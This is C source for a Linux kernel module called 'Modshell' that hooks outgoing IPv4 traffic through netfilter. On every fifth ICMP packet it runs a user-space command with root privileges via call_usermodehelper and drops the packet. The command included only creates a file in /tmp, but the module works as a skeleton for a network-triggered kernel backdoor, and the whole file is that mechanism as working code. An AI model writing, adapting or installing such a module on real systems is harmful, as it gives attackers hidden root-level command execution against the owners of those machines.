#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/ip.h>
#include <linux/version.h>
#include <linux/skbuff.h>
#include <linux/netfilter.h>
#include <linux/netfilter_ipv4.h>
#include <linux/moduleparam.h>
#include <linux/netfilter_ipv4/ip_tables.h>
#include <linux/kmod.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Powered By Cnbird!");
MODULE_DESCRIPTION("Modshell version 0.1!");

static atomic_t pktcnt;
static unsigned int modshell_func(void *data, struct sk_buff *skb, const struct nf_hook_state* state)
{
   const struct iphdr *iph = ip_hdr(skb);
   if(iph->protocol == 1){
      atomic_inc(&pktcnt);
      if(atomic_read(&pktcnt)%5 == 0){
          char * envp[] = { "HOME=/home/qwert/", "PATH=/usr/bin:/sbin:/bin",NULL };
	  char * argv[] = { "/usr/bin/touch", "/tmp/cnbird", NULL };
	  int result;
	  result=call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
	  printk(KERN_NOTICE "Execute Command is: %d\n", result);
	  return NF_DROP;
      }
   }
   return NF_ACCEPT;
}

static struct nf_hook_ops nfho={
        .hook           = modshell_func, 
        //.owner          = THIS_MODULE,
        .pf             = PF_INET,
        .hooknum        = NF_INET_LOCAL_OUT, 
        .priority       = NF_IP_PRI_FIRST, 
};

static int __init modshell_init(void)
{
    atomic_set(&pktcnt, 0);
    return nf_register_net_hook(&init_net, &nfho);
}

static void __exit modshell_fini(void)
{
    nf_unregister_net_hook(&init_net, &nfho);
}

module_init(modshell_init);
module_exit(modshell_fini);
